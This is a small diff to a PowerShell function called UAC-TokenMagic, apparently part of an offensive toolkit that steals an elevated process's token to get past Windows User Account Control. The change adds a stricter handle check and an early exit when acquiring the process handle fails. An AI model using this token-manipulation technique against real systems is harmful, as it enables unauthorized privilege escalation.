@@ -253,10 +253,11 @@ function UAC-TokenMagic {
 		# We don't actually check if the process is elevated, be smart
 		# QueryLimitedInformation = 0x1000
 		$hProcess = [UACTokenMagic]::OpenProcess(0x00001000,$false,$ProcPID)
-		if ($hProcess) {
+		if ($hProcess -ne 0) {
 			echo "[*] Successfully acquired $((Get-Process -Id $ProcPID).Name) handle"
 		} else {
 			echo "[!] Failed to get process token!`n"
+			Break
 		}
 	} else {
 		# Prepare ShellExecuteEx
